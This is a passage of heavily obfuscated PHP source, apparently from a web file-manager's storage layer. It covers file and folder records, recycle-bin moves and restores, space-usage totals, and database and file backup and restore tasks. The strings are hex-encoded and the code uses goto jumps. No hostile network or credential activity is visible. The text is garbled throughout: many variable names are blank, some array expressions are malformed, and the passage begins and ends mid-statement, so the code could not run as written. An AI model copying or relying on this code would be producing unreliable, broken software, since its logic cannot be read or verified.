$ɪ㹋[32] => $Ȇ); $թ = $this->field($ɪ㹋[2499])->where($馓)->select(); if (!$թ) { return !1; } $թ = array_sort_by($թ, $ɪ㹋[520]); $ = intval($թ[0][$ɪ㹋[191]]); } $ = $this->sourceInfo($); $this->pathInfoFilter($); return $; } protected function updateModifyTime($) { $ˑ =& $_SERVER[ܮ]; $ = KodUser::id(); if (!$) { return; } if (!is_array($)) { $ = array($); } foreach ($ as $ => $) { $[$] = intval($); $this->sourceCacheClear($); } $Ј = array($ˑ[191] => array($ˑ[7], $)); $ܫ = array($ˑ[673] => $, $ˑ[513] => time()); $this->where($Ј)->save($ܫ); } public function folderSizeReset($Օ, $ = false) { $ =& $_SERVER[ܮ]; if ($this->statusIgnoreResetSpace) { return; } if (!$Օ) { return; } $ܠ = $this->sourceInfo($Օ); $Ț = $[2500] . $Օ; if (!$ܠ || !$ܠ[$[191]]) { return; } CacheLock::lock($Ț, 20); if ($ === !1) { $this->sourceCacheClear($Օ); $ܠ = $this->sourceInfo($Օ); $¼Ȣ = array($[492] => $Օ, $[519] => 0); $Ν = $this->where($¼Ȣ)->sum($[79]); $ = intval($Ν) - intval($ܠ[$[79]]); } if ($ == 0) { return CacheLock::unlock($Ț); } $ = $this->parentLevelArray($ܠ[$[604]]); if (!$) { $ = array(); } $[] = $ܠ[$[191]]; $¼Ȣ = array($[191] => array($[507], $)); if ($ < 0) { $¼Ȣ[$[79]] = array($[1183], abs($)); } $this->where($¼Ȣ)->setAdd($[79], $); CacheLock::unlock($Ț); if (!$ܠ[$[589]] || $ܠ[$[589]] == $[228]) { return; } $ = $[2501] . $ܠ[$[188]] . $[4] . $ܠ[$[589]]; $ӀɄ = array($ܠ[$[188]], $ܠ[$[589]]); TaskRun::timeLimitCall($, $[2502], $ӀɄ, 1.5); } public function folderSizeResetChildren($Ў) { $ϋ =& $_SERVER[ܮ]; $this->sourceCacheClear($Ў); $ = $this->sourceInfo($Ў); if (!$) { return; } $ = array($ϋ[668] => 1, $ϋ[671] => $[$ϋ[589]], $ϋ[674] => array($ϋ[635], $[$ϋ[604]] . $Ў . $ϋ[636])); $Ɩ = $ϋ[2503]; $ = $this->field($Ɩ)->where($)->select(); $[$ϋ[500]] = 0; $ = $this->field($Ɩ)->where($)->select(); if (!$) { return; } $[] = $; $ = array_to_keyvalue($, $ϋ[191]); foreach ($ as $ф => $) { $[$ф][$ϋ[2504]] = $[$ф][$ϋ[79]]; $[$ф][$ϋ[79]] = 0; } foreach ($ as $) { $Ю = $[$ϋ[190]] . $ϋ[12]; if (!isset($[$Ю])) { continue; } if ($[$ϋ[520]] == $[$Ю][$ϋ[520]]) { $[$Ю][$ϋ[79]] += $[$ϋ[79]]; } } foreach ($ as $) { $ = $this->parentLevelArray($[$ϋ[604]]); foreach ($ as $Ю) { $Ю = $Ю . $ϋ[12]; if (!isset($[$Ю])) { continue; } if ($[$ϋ[520]] == $[$Ю][$ϋ[520]]) { $[$Ю][$ϋ[79]] += $[$ϋ[79]]; } } } $ = array(); foreach ($ as $) { if ($[$ϋ[79]] == $[$ϋ[2504]]) { continue; } $[] = array($ϋ[191], $[$ϋ[191]], $ϋ[79], $[$ϋ[79]]); } $this->saveAll($); } public function userSpaceReset($໩ = false) { $ր =& $_SERVER[ܮ]; $ˈ = $this->where(array($ր[188] => self::TYPE_USER, $ր[589] => $໩, $ր[500] => 0))->sum($ր[79]); $ˈ = !$ˈ || $ˈ <= 0 ? 0 : $ˈ; Model($ր[597])->userEdit($໩, array($ր[2170] => $ˈ)); } public function targetSpaceUpdate($, $) { $ј =& $_SERVER[ܮ]; if (!$) { return; } if (!in_array($, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ș = $this->targetSpaceSize($, $); if ($ == self::TYPE_USER) { Model($ј[597])->userEdit($, array($ј[2170] => $ș)); } else { if ($ == self::TYPE_GROUP) { Model($ј[605])->groupEdit($, array($ј[2170] => $ș)); } } } public function targetSpaceSize($̢, $) { $ũ =& $_SERVER[ܮ]; $ʘȲ = 0; $ɢ = $this->targetSourceRoot($̢, $, !0); foreach ($ɢ as $㭖ڂ) { if (!$㭖ڂ) { continue; } $ʘȲ += floatval($㭖ڂ[$ũ[79]]); $و = array($ũ[674] => array($ũ[635], $ũ[613] . $㭖ڂ[$ũ[191]] . $ũ[636])); $ = Model($ũ[518])->field($ũ[506])->where($و)->select(); $ = array_to_keyvalue($, $ũ[12], $ũ[191]); $ = array_unique(array_filter($)); if ($) { $و = array($ũ[506] => array($ũ[507], $)); $ʘȲ += floatval($this->where($و)->sum($ũ[79])); } } $ʘȲ = !$ʘȲ || $ʘȲ <= 0 ? 0 : $ʘȲ; return $ʘȲ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ҩď) { return $this->fileTypeProfile($ҩď, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ℰ) { return $this->fileTypeProfile($ℰ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($, $) { $ =& $_SERVER[ܮ]; $׹ = $[2505] . $ . $[11] . $; $ؓ = Cache::get($׹); if ($ؓ) { return $ؓ; } $ = array($[668] => 0); if ($ != !1) { $[$[589]] = $; $[$[188]] = $; } $ֽ = array(); $ݷ͇ = $this->field(array($[955] => $[956], $[957] => $[79]))->where($)->find(); $ֽ[$[2506]] = array($[2507] => LNG($[2506]), $[2508] => intval($ݷ͇[$[956]]), $[640] => intval($ݷ͇[$[79]])); $З = KodIO::fileTypeList(); foreach ($З as $ => $ע) { $[$[501]] = $this->fileTypeWhere($); $ݷ͇ = $this->field(array($[955] => $[956], $[957] => $[79]))->where($)->find(); $ֽ[$] = array($[2507] => $ע[$[32]], $[2508] => intval($ݷ͇[$[956]]), $[640] => intval($ݷ͇[$[79]])); } Cache::set($׹, $ֽ, 1200); return $ֽ; } public function fileNameExist($훜, $Ѥ) { $턿̀ =& $_SERVER[ܮ]; $ = $this->field($턿̀[2509])->where(array($턿̀[190] => $훜, $턿̀[32] => $Ѥ, $턿̀[520] => 0))->find(); return is_array($) ? $[$턿̀[191]] : !1; } public function childList($ҹ) { $ă =& $_SERVER[ܮ]; $Ь = $ă[2482] . $ҹ; if (isset(self::$cacheChildList[$Ь])) { return self::$cacheChildList[$Ь]; } $ο = array($ă[190] => intval($ҹ), $ă[520] => 0); $ӯ = $this->where($ο)->select(); $ӯ = $ӯ ? $ӯ : array(); self::$cacheChildList[$Ь] = $ӯ; foreach ($ӯ as $ѱ) { $Ь = $ă[547] . $ѱ[$ă[191]]; self::$cacheSourceInfo[$Ь] = $ѱ; } return $ӯ; } public function fileNameAuto($, $, $ҷ = REPEAT_RENAME, $ = false) { $ =& $_SERVER[ܮ]; $֪ = get_path_ext($); $τ = $֪ ? get_path_ext_name($) . $[2510] . $֪ : $ . $[474]; $̷ = array($[190] => $, $[520] => 0, $[32] => array($[473], $τ)); $ = $this->field($[32])->where($̷)->select(); $ƿ = array_to_keyvalue($, $[12], $[32]); return $this->fileNameAutoGet($ƿ, $, $ҷ, $); } public function fileNameAutoGet($걻, $ǖ, $Ɗ, $ڠ) { $ܓ =& $_SERVER[ܮ]; if ($Ɗ == REPEAT_REPLACE || !$걻 || !in_array_not_case($ǖ, $걻) || $ڠ && $Ɗ != REPEAT_RENAME_FOLDER) { return $ǖ; } if ($Ɗ == REPEAT_SKIP) { return !1; } $ = $ܓ[10] . get_path_ext($ǖ); $ = $ == $ܓ[10] || $ڠ ? $ܓ[12] : $; for ($˒ = 1; $˒ <= count($걻) + 1; $˒++) { $ڠ = substr($ǖ, 0, strlen($ǖ) - strlen($)); $ = $ڠ . "\50{$˒}\x29{$}"; if (!in_array_not_case($, $걻)) { return $; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\143\x65\137\162\145\143\171\143\x6c\x65"; protected $dataAuto = array(array("\143\x72\145\x61\164\x65\124\x69\155\x65", "\164\151\155\x65", "\151\x6e\x73\145\162\164", "\x66\x75\156\x63\x74\151\x6f\156")); public function listData($ = false) { $߻ =& $_SERVER[ܮ]; $ = $ ? $ : USER_ID; $آ = $this->where(array($߻[1968] => $))->select(); return array_to_keyvalue($آ, $߻[12], $߻[191]); } public function moveToRecycle($) { $㥡 =& $_SERVER[ܮ]; $ӗ = Model($㥡[1534]); $цο = $ӗ->sourceInfo($); if (!$цο || $цο[$㥡[520]] == $㥡[91]) { return; } $ = array($㥡[506] => $, $㥡[1968] => USER_ID, $㥡[670] => $цο[$㥡[188]], $㥡[671] => $цο[$㥡[589]], $㥡[674] => $цο[$㥡[604]]); $this->add($); $this->recycleMove($, 1); if ($цο[$㥡[500]] == $㥡[91]) { $ = array($㥡[674] => array($㥡[635], $цο[$㥡[604]] . $ . $㥡[636])); $ӗ->where($)->setField($㥡[520], 1); } } public function clear() { $this->remove(!1); } public function remove($ = false, $Ⲛ = false) { $Պ =& $_SERVER[ܮ]; $Ⲛ = $Ⲛ ? $Ⲛ : USER_ID; $ĩǨ = Model($Պ[1534]); $ = $this->listData($Ⲛ); $ = $ === !1 ? !1 : $; $㷊 = array(); foreach ($ as $) { if ($ != !1 && !in_array($, $)) { continue; } $ = $ĩǨ->sourceInfo($); $ĩǨ->remove($, !1); $ = $[$Պ[188]] . $Պ[11] . $[$Պ[589]]; $㷊[$] = array($Պ[670] => $[$Պ[188]], $Պ[589] => $[$Պ[589]]); $this->where(array($Պ[191] => $))->delete(); } foreach ($㷊 as $ϭ) { $ĩǨ->targetSpaceUpdate($ϭ[$Պ[188]], $ϭ[$Պ[589]]); } } public function restore($ = false) { $ = $this->listData(); $this->_restoreSource($, $); } public function removeUserAll($) { $this->remove(!1, $); } public function restoreItem($䖽) { $this->_restoreSource(array($䖽), array($䖽)); } private function _restoreSource($ǼΛ, $ս) { $Ǖ =& $_SERVER[ܮ]; $ = Model($Ǖ[1534]); $ս = $ս == !1 ? !1 : $ս; if (!$ǼΛ) { return !0; } $Ř = array(); foreach ($ǼΛ as $渘鲯) { if ($ս != !1 && !in_array($渘鲯, $ս)) { continue; } $ݸ = $->sourceInfo($渘鲯); $ = $->sourceInfo($ݸ[$Ǖ[190]]); if ($[$Ǖ[520]] == $Ǖ[91]) { continue; } $->lockMoveStart($渘鲯); $this->recycleMove($渘鲯, 0); if ($ݸ[$Ǖ[500]] == $Ǖ[91]) { $Թƚ = array($Ǖ[674] => array($Ǖ[635], $ݸ[$Ǖ[604]] . $渘鲯 . $Ǖ[636])); $->where($Թƚ)->setField($Ǖ[520], 0); $this->restoreFolderChildren($渘鲯, $ǼΛ); } $this->where(array($Ǖ[191] => $渘鲯))->delete(); $->folderSizeReset($ݸ[$Ǖ[190]]); $Ř[] = $ݸ[$Ǖ[190]]; if ($ݸ[$Ǖ[500]] == $Ǖ[91]) { $Ř[] = $渘鲯; } $->lockMoveEnd($渘鲯); } $->updateModifyTime($Ř); } private function restoreFolderChildren($, $ɵ) { $ =& $_SERVER[ܮ]; $ = Model($[1534]); $衘 = array($[191] => array($[7], array())); foreach ($ɵ as $ԭ) { if ($ԭ == $) { continue; } if (!$->isParentOf($, $ԭ)) { continue; } $֤ = $->sourceInfo($ԭ); if ($֤[$[500]] == $[91]) { $衘[] = array($[674] => array($[635], $֤[$[604]] . $ԭ . $[636])); } else { $衘[$[191]][1][] = $ԭ; } } if (!$衘[$[191]][1]) { unset($衘[$[191]]); } if (!$衘) { return; } if (is_array($衘[$[191]]) && is_array($衘[$[191]][1])) { $衘[$[191]][1] = array_unique($衘[$[191]][1]); } $衘[$[1168]] = $[2284]; $->where($衘)->setField($[520], 1); } private function recycleMove($, $Ļ = 1) { $ᚼ =& $_SERVER[ܮ]; $嵲 = Model($ᚼ[1534]); $ = Model($ᚼ[2511]); $ǹ = array($ᚼ[191] => $); if ($Ļ) { $嵲->where($ǹ)->setField($ᚼ[520], 1); $->eventRecycle($, $ᚼ[2512]); } else { $ڹ = $嵲->where($ǹ)->find(); $ = $ڹ[$ᚼ[500]] == $ᚼ[91]; $ = $嵲->fileNameAuto($ڹ[$ᚼ[190]], $ڹ[$ᚼ[32]], REPEAT_RENAME_FOLDER, $); if ($ != $ڹ[$ᚼ[32]]) { $嵲->rename($, $); } $嵲->where($ǹ)->setField($ᚼ[520], 0); $->eventRecycle($, $ᚼ[974]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\163\157\x75\x72\x63\145\x53\145\x63\x72\145\x74\x4c\151\x73\x74"; public $field = array("\x73\x6f\165\162\143\x65\111\104", "\164\x79\x70\x65\111\104", "\143\162\x65\141\164\145\125\x73\x65\x72"); } goto CҩƉ; D՗: class BackupDbFile { public function __construct() { } public function index() { $ԍ =& $_SERVER[ܮ]; $ = Backup::get(); $ǰ = $[$ԍ[32]]; $彅 = $this->tmpFilesPath() . "\x62\x61\143\153\x75\x70\x5f{$ǰ}\x2f"; $뜠 = $this->backupPath($); if (!($뜠 = IO::mkdir($뜠))) { Backup::log($ԍ[906] . $뜠); return !1; } $ = new DbManage(); $ = $->getSqlFile(); if (!$ || !$[$ԍ[907]] || !$[$ԍ[13]]) { Backup::log($ԍ[908]); return !1; } IO::move($[$ԍ[907]], $彅); IO::move($[$ԍ[13]], $彅); $->mixBakList($彅); $٤ = IO::listPath($彅); $׮ = isset($٤[$ԍ[86]]) ? $٤[$ԍ[86]] : array(); $׃ԭ = array_sum(array_column($׮, $ԍ[79])); if (!$׃ԭ) { Backup::log($ԍ[909] . $彅); return !1; } $ = array($ԍ[910] => $׃ԭ, $ԍ[911] => time()); Backup::set($); Hook::trigger($ԍ[912], $彅, $뜠); $ڡ = new TaskFileTransfer($ԍ[912], $ԍ[877], count($׮), LNG($ԍ[885]) . $ԍ[476] . LNG($ԍ[887]) . $ԍ[913]); $ڡ->task[$ԍ[862]] = $׃ԭ; foreach ($٤[$ԍ[86]] as $Ȥ) { $ = IO::move($Ȥ[$ԍ[87]], $뜠); if (!$) { $ڡ->end(); $ = IO::getLastError($ԍ[914] . $Ȥ[$ԍ[87]] . $ԍ[915] . $뜠 . $ԍ[175]); Backup::log($); return !1; } } $ڡ->end(); $ = array($ԍ[916] => $׃ԭ, $ԍ[917] => time()); Backup::set($); return !0; } private function backupPath($) { $ =& $_SERVER[ܮ]; $ = $[$[32]]; $ = Model($[871])->get($[872]); $ٝ = substr(md5($[873] . $ . $), 0, 8); return "\x7b\151\x6f\72{$[$[850]]}\175\57\x64\x61\164\x61\142\x61\163\x65\57\142\141\143\x6b\165\x70\57" . $ . $[11] . $ٝ; } private function tmpFilesPath() { $֢ =& $_SERVER[ܮ]; $ = TEMP_FILES; if ($GLOBALS[$֢[6]][$֢[92]][$֢[896]]) { $ = $GLOBALS[$֢[6]][$֢[92]][$֢[896]]; if (!mk_dir($) || !is_writable($) || !IO::mkfile($ . $֢[897])) { $ = TEMP_FILES; } } return $; } } class BackupFile { protected $bakVer = "\x6f\154\x64"; public function __construct($ = false) { $풛 =& $_SERVER[ܮ]; $this->bakVer = $ ? $풛[918] : $풛[919]; } public function index() { $Ũ = Backup::get(); $ = $Ũ[$_SERVER[ܮ][854]][$_SERVER[ܮ][230]][$_SERVER[ܮ][557]]; $ = array($_SERVER[ܮ][558] => array($_SERVER[ܮ][920], $), $_SERVER[ܮ][921] => array($_SERVER[ܮ][406], $Ũ[$_SERVER[ܮ][850]])); $Š魫 = (int) Model($_SERVER[ܮ][922])->where($)->count($_SERVER[ܮ][557]); $ґ = (int) Model($_SERVER[ܮ][922])->where($)->sum($_SERVER[ܮ][79]); $ = new TaskFileTransfer($_SERVER[ܮ][923], $_SERVER[ܮ][877], $Š魫, LNG($_SERVER[ܮ][885]) . $_SERVER[ܮ][886] . LNG($_SERVER[ܮ][924])); $->task[$_SERVER[ܮ][862]] = $ґ; $ذߟ = array($_SERVER[ܮ][925] => $Š魫, $_SERVER[ܮ][926] => $ґ, $_SERVER[ܮ][927] => time()); Backup::set($ذߟ); $à = !0; $ = $this->storeIds(); $܊ = 1; $ = 1000; $ù = $ = 0; $̓ӎ = array(); $ϒ = $ꈥ = 0; do { $Ʈ۰ = $_SERVER[ܮ][928]; $߇ = Model($_SERVER[ܮ][922])->where($)->field($Ʈ۰)->order($_SERVER[ܮ][929])->selectPage($, $܊); $̅ɽ = !empty($߇[$_SERVER[ܮ][446]]) ? $߇[$_SERVER[ܮ][446]] : array(); foreach ($̅ɽ as $թ) { if (!$this->_fileExist($թ, $̓ӎ, $)) { Backup::log($_SERVER[ܮ][930] . $թ[$_SERVER[ܮ][557]] . $_SERVER[ܮ][931] . $թ[$_SERVER[ܮ][87]]); continue; } $ = $թ[$_SERVER[ܮ][87]]; $ϯ = "\173\151\157\x3a{$Ũ[$_SERVER[ܮ][850]]}\x7d" . substr($, strlen("\x7b\151\x6f\x3a{$թ[$_SERVER[ܮ][932]]}\x7d")); if (IO::exist($ϯ)) { $->updateFileEnd($թ[$_SERVER[ܮ][32]], $թ[$_SERVER[ܮ][79]]); } else { $ϯ = get_path_father($ϯ); IO::mkdir($ϯ); if (!IO::copy($, $ϯ, $_SERVER[ܮ][933])) { Backup::log($_SERVER[ܮ][934] . $ . $_SERVER[ܮ][915] . $ϯ . $_SERVER[ܮ][175]); $à = !1; break; } } $ = $թ[$_SERVER[ܮ][557]]; $ += 1; $ù += $թ[$_SERVER[ܮ][79]]; $ꈥ += 1; $ϒ += $թ[$_SERVER[ܮ][79]]; if ($ù >= 1024 * 1024 * 100) { $ذߟ = array($_SERVER[ܮ][849] => $, $_SERVER[ܮ][935] => $ꈥ, $_SERVER[ܮ][936] => $ϒ); Backup::set($ذߟ); $ù = $ = 0; } } $ʛ = count($̅ɽ); $܊++; } while ($ʛ == $); $->end(); $ذߟ = array($_SERVER[ܮ][937] => 1, $_SERVER[ܮ][860] => time(), $_SERVER[ܮ][876] => 1, $_SERVER[ܮ][849] => $, $_SERVER[ܮ][938] => time()); if ($) { $ذߟ[$_SERVER[ܮ][935]] = $ꈥ; $ذߟ[$_SERVER[ܮ][936]] = $ϒ; } Backup::set($ذߟ); return !0; } private function _fileExist($Р, &$, $) { $ =& $_SERVER[ܮ]; $Һ = $Р[$[87]]; if (in_array($Р[$[557]], $)) { return !1; } if (!in_array($Р[$[932]], $)) { return !1; } if (IO::exist($Һ)) { return !0; } $ڊ = get_path_father($Һ); if (IO::exist($ڊ)) { $[] = $Р[$[557]]; return !1; } $ƣȀ = array($[932] => $Р[$[932]], $[87] => array($[473], "{$ڊ}\x25")); $ = Model($[922])->where($ƣȀ)->field($[558])->select(); $ = array_merge($, array_to_keyvalue($, $[12], $[557])); return !1; } private function _fileFilter($ˠ) { $ʳ =& $_SERVER[ܮ]; return; if (empty($ˠ)) { return; } $ = array($ʳ[557] => array($ʳ[7], array_unique($ˠ))); $쁨 = Model($ʳ[939])->where($)->field($ʳ[191])->select(); foreach ($쁨 as $ߵ) { Model($ʳ[939])->remove($ߵ[$ʳ[191]], !1); } } private function storeIds() { $ =& $_SERVER[ܮ]; $ၠ = Model($[866])->listData(); $ = array(); $ڒ = $GLOBALS[$[6]][$[92]][$[940]]; foreach ($ၠ as $) { $ܐ = strtolower($[$[96]]); if (!isset($ڒ[$ܐ])) { continue; } $ = $[77] . (isset($ڒ[$ܐ]) ? $ڒ[$ܐ] : ucfirst($ܐ)); if (!class_exists($)) { continue; } $[] = $[$[487]]; } return $; } public function start($, $) { $ѱ =& $_SERVER[ܮ]; $ = KodIO::makePath(KodIO::KOD_IO, $); if (!$this->checkStore($)) { write_log($ѱ[941] . $, $ѱ[942]); return; } $͕ = KodIO::defaultDriver(); if ($͕[$ѱ[487]] == $) { write_log($ѱ[943] . $, $ѱ[942]); return; } $ = $ѱ[944]; $ = Task::get($); if ($) { if ($[$ѱ[848]] == $ѱ[945]) { return; } Task::kill($); } $ɲ = array($ѱ[850] => $, $ѱ[557] => 0, $ѱ[204] => 0, $ѱ[854] => array($ѱ[857] => 0, $ѱ[946] => 0, $ѱ[862] => 0, $ѱ[947] => 0, $ѱ[948] => 0)); $ = Model($ѱ[871])->get($ѱ[949], $ѱ[877]); $ = json_decode($, !0); if (!$) { $ = array(); } if ($[$ѱ[850]] && $[$ѱ[850]] != $) { $[$ѱ[557]] = 0; $[$ѱ[850]] = $; } $ = array_merge($ɲ, $); $Չ = _get($GLOBALS, $ѱ[7], array()); if ($Չ[$ѱ[853]] == $ѱ[91] && $Չ[$ѱ[950]] == $ѱ[91] || !$[$ѱ[557]]) { $ = $ɲ; } $ = KodIO::makePath(KodIO::KOD_IO, $[$ѱ[850]]); $ = $ . $ѱ[951]; if (!file_exists($)) { $Ð = file_get_contents(__DIR__ . $ѱ[952]); if (defined($ѱ[953]) && INSTALL_CHANNEL) { $Ð = str_replace($ѱ[954], INSTALL_CHANNEL, $Ð); } file_put_contents($, $Ð); } $ޔ = $ * 60 * 0.8; $߳ = timeFloat(); $ß = Model($ѱ[560]); $ = array($ѱ[558] => array($ѱ[920], $[$ѱ[557]])); $ = $ß->field(array($ѱ[955] => $ѱ[956], $ѱ[957] => $ѱ[79]))->where($)->find(); if (!$[$ѱ[956]]) { return; } $ = intval($[$ѱ[956]]); $ = intval($[$ѱ[79]]); $[$ѱ[854]][$ѱ[857]] += $; $[$ѱ[854]][$ѱ[862]] += $; $[$ѱ[204]] = time(); Model($ѱ[871])->set($ѱ[949], $, $ѱ[877]); $ = new TaskFileTransfer($, $ѱ[877], $, LNG($ѱ[885]) . $ѱ[886] . LNG($ѱ[924])); $->task[$ѱ[862]] = $; $ = 500; $ = 1; $ؖ = $ѱ[928]; $ = $ß->where($)->field($ؖ)->order($ѱ[929])->selectPage($, $); $Ǫ = array($ѱ[857] => 0, $ѱ[958] => 0, $ѱ[948] => 0, $ѱ[959] => $[$ѱ[557]], $ѱ[960] => 0); $ = intval($[$ѱ[443]][$ѱ[445]]); while ($ && $ <= $) { if (timeFloat() - $߳ > $ޔ) { break; } foreach ($[$ѱ[446]] as $Ό) { if (timeFloat() - $߳ > $ޔ) { break; } $Ǫ[$ѱ[857]]++; $Ǫ[$ѱ[960]] = $Ό[$ѱ[557]]; $[$ѱ[557]] = $Ό[$ѱ[557]]; $[$ѱ[854]][$ѱ[946]]++; $[$ѱ[854]][$ѱ[947]] += $Ό[$ѱ[79]]; $﯐ȼ = $Ό[$ѱ[87]]; if (!$this->isFileExist($Ό, $ß)) { $->updateFileEnd($Ό[$ѱ[32]], $Ό[$ѱ[79]]); $[$ѱ[854]][$ѱ[948]]++; $Ǫ[$ѱ[958]]++; write_log($ѱ[930] . $Ό[$ѱ[557]] . $ѱ[931] . $﯐ȼ, $ѱ[942]); continue; } $ӈ = $ . substr($﯐ȼ, strlen("\173\151\157\72{$Ό[$ѱ[932]]}\175\x2f")); if (IO::exist($ӈ)) { $->updateFileEnd($Ό[$ѱ[32]], $Ό[$ѱ[79]]); continue; } $ӈ = get_path_father($ӈ); if (!IO::copy($﯐ȼ, $ӈ, REPEAT_SKIP)) { $[$ѱ[854]][$ѱ[948]]++; $Ǫ[$ѱ[948]]++; write_log($ѱ[961] . $Ό[$ѱ[557]] . $ѱ[931] . $﯐ȼ, $ѱ[942]); } $->updateFileEnd($Ό[$ѱ[32]], $Ό[$ѱ[79]]); } Model($ѱ[871])->set($ѱ[949], $, $ѱ[877]); $++; $ = $ß->where($)->field($ؖ)->order($ѱ[929])->selectPage($, $); } $->end(); write_log($ѱ[962] . json_encode($Ǫ), $ѱ[942]); if (IO::mkdir($ . $ѱ[963])) { $Ǫ[$ѱ[960]] = $[$ѱ[557]]; IO::setContent($ . $ѱ[964] . date($ѱ[965]) . $ѱ[966], json_encode($Ǫ)); } Model($ѱ[871])->set($ѱ[949], $, $ѱ[877]); return !0; } private function isFileExist($㵹, $蝡) { $݊ =& $_SERVER[ܮ]; static $޽ = null; static $Σ = null; if (is_null($޽)) { $޽ = $Σ = array(); } $ = $㵹[$݊[932]]; $Р = KodIO::parse($㵹[$݊[87]]); if ($ != $Р[$݊[487]]) { return !1; } if (!isset($޽[$])) { $޽[$] = $this->checkStore($); } if ($޽[$] !== 1) { return !1; } if (in_array($㵹[$݊[557]], $Σ)) { return !1; } $ì = $㵹[$݊[87]]; if (IO::exist($ì)) { return !0; } $ = get_path_father($ì); if (IO::exist($)) { $Σ[] = $㵹[$݊[557]]; return !1; } $Չ = array($݊[932] => $, $݊[87] => array($݊[473], "{$}\x25")); $ = $蝡->where($Չ)->field($݊[558])->select(); $Σ = array_merge($Σ, array_to_keyvalue($, $݊[12], $݊[557])); return !1; } public function checkStore($󊵪) { static $飈; if (is_null($飈)) { $飈 = Model($_SERVER[ܮ][866]); } $б = $飈->listData($󊵪); if (!$б) { return 0; } try { $ = $飈->checkConfig($б, !0); } catch (Exception $ˑ) { $ = !1; } return $ === !0 ? 1 : 0; } } class RestoreFile { public $message; public function __construct() { } public function start($झ) { $ =& $_SERVER[ܮ]; $ = Model($[871]); if ($->get($[967]) == $[968]) { $this->message = LNG($[969]); return !1; } $झ = rtrim($झ, $[8]) . $[8]; $ = IO::listPath($झ); if (empty($[$[85]]) && empty($[$[86]])) { show_json(LNG($[970]), !1); } $ = $[971]; $ = Task::get($); if ($) { if ($[$[848]] == $[945]) { $this->message = LNG($[972]); return !0; } Task::kill($); } $Ɖ = array($[87] => $झ, $[557] => 0, $[204] => 0, $[854] => array($[857] => 0, $[946] => 0, $[862] => 0, $[947] => 0, $[948] => 0), $[973] => array($[857] => 0, $[946] => 0, $[948] => 0)); $ = $->get($[949], $[974]); $ = json_decode($, !0); if (!$) { $ = array(); } $ = array_merge($Ɖ, $); if (_get($GLOBALS, $[975], 0) == $[91] || !$[$[557]]) { $ = $Ɖ; } $ح = Model($[560]); $ = array($[558] => array($[920], $[$[557]])); $ = $ح->field(array($[955] => $[956], $[957] => $[79]))->where($)->find(); if (!intval($[$[956]])) { $this->message = LNG($[976]); return !0; } $ڐ = intval($[$[956]]); $ = intval($[$[79]]); $[$[854]][$[857]] += $ڐ; $[$[854]][$[862]] += $; $[$[973]][$[857]] = $ڐ; $[$[204]] = time(); $->set($[949], $, $[974]); $ = KodIO::defaultDriver(); $ۍы = $[$[487]]; $՘ = KodIO::makePath(KodIO::KOD_IO, $ۍы); $ = new TaskFileTransfer($, $[974], $ڐ, LNG($[977]) . $[886] . LNG($[924])); $->task[$[862]] = $; $آ = 1000; $֞ = 1; $ͱ = $[928]; $ = $ح->where($)->field($ͱ)->order($[929])->selectPage($آ, $֞); $Е = intval($[$[443]][$[445]]); while ($ && $֞ <= $Е) { $̎ = array(); foreach ($[$[446]] as $) { $[$[557]] = $[$[557]]; $[$[854]][$[946]]++; $[$[854]][$[947]] += $[$[79]]; $[$[973]][$[946]]++; $֨ = $[$[87]]; if (IO::exist($֨)) { $->update(1); continue; } $Ԏ = substr($֨, strlen("\173\x69\x6f\72{$[$[932]]}\175\x2f")); $ğ = $՘ . $Ԏ; if ($ۍы != $[$[932]] && IO::exist($ğ)) { $->update(1); $̎[$[$[557]]] = $ğ; continue; } $ۮ = $झ . $Ԏ; if (!$this->isFileExist($ۮ)) { $->update(1); $[$[854]][$[948]]++; $[$[973]][$[948]]++; write_log($[978] . $ۮ, $[979]); continue; } $ = get_path_father($ğ); IO::mkdir($); if (!IO::copy($ۮ, $, REPEAT_SKIP)) { $[$[854]][$[948]]++; $[$[973]][$[948]]++; write_log($[980] . $ۮ . $[981] . $[$[557]], $[979]); } else { $̎[$[$[557]]] = $ğ; } $->update(1); } $this->updateFileBatch($, $̎, $ۍы); $֞++; $ = $ح->where($)->field($ͱ)->order($[929])->selectPage($آ, $֞); } $->end(); $this->updateFileBatch($, $̎, $ۍы); $ = Model($[866])->listData(); $ = array_to_keyvalue($, $[12], $[487]); $ϣ = md5($[982] . implode($[50], $)); Cache::remove($ϣ); return !0; } private function isFileExist($) { static $ǭ = null; if (is_null($ӣ)) { $ǭ = array(); } $ޝ = get_path_father($); if (in_array($ޝ, $ǭ)) { return !1; } if (!IO::exist($ޝ)) { $ǭ[] = $ޝ; return !1; } return IO::exist($); } private function updateFileBatch($, &$, $Ŗ) { $ڤ =& $_SERVER[ܮ]; Model($ڤ[871])->set($ڤ[949], $, $ڤ[974]); if (!$) { return; } $ϗ = Model($ڤ[560]); $ = $򇌷 = array(); foreach ($ as $ǁۥ => $) { $[] = array($ڤ[557], $ǁۥ, $ڤ[932], $Ŗ); $򇌷[] = array($ڤ[557], $ǁۥ, $ڤ[87], $); } $ϗ->saveAll($); $ϗ->saveAll($򇌷); write_log($ڤ[983] . count($) . $ڤ[984] . $Ŗ, $ڤ[979]); $ = array(); } private function updateFile($ж, $ؚ, $Û, $ȷ) { $ =& $_SERVER[ܮ]; $ = array($[932] => $ؚ, $[87] => $Û); $ = $ȷ->where(array($[557] => $ж))->save($); if ($) { return; } write_log($[985] . $ж, $[979]); } } goto fͪÅ; DΪ: function binCheckBigger($Ю, $) { return $Ю > $; } $_SERVER[$_SERVER[][3]] = (base64_decode('OTI0Mw==')."\x35\x30")+0;$_wplg="smqozk3gfdrb1al05uwe2jvychti74p986nxepuk284hbmjg3irqy0d156vsfcawoxt9z";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($, $) { $٥ =& $_SERVER[ܮ]; if (isset(self::$_methodList[$])) { return @call_user_func_array(self::$_methodList[$], $); } else { if (method_exists($this, $)) { return call_user_func_array(array($this, $), $); } else { think_exception(__CLASS__ . $٥[4] . $ . $٥[5]); } } } public static function __callStatic($, $) { if (isset(self::$_methodListStatic[$])) { return call_user_func_array(self::$_methodListStatic[$], $); } else { if (method_exists(self, $)) { return call_user_func_array(array(self, $), $); } else { 